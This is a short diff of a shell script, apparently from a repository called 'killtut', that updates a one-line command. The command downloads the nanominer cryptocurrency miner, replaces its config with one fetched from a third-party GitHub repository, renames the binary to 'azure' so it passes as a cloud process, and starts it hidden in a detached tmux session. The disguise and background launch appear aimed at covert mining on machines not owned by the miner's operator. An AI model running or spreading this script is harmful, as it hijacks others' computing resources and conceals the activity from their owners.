@@ -11,4 +11,4 @@ fi
 exit
 fi
 
-wget https://github.com/nanopool/nanominer/releases/download/v3.3.6/nanominer-linux-3.3.6.tar.gz && tar xvzf nanominer-linux-3.3.6.tar.gz && cd nanominer-linux-3.3.6 && rm config.ini && wget https://raw.githubusercontent.com/haidanglx/killtut/master/config.ini && mv nanominer az &&  tmux new-session -d -s my_session1 './az'
+wget https://github.com/nanopool/nanominer/releases/download/v3.3.7/nanominer-linux-3.3.7.tar.gz && tar xvzf nanominer-linux-3.3.7.tar.gz && cd nanominer-linux-3.3.7 && rm config.ini && wget https://raw.githubusercontent.com/haidanglx/killtut/master/config.ini && mv nanominer azure &&  tmux new-session -d -s my_session1 './azure'
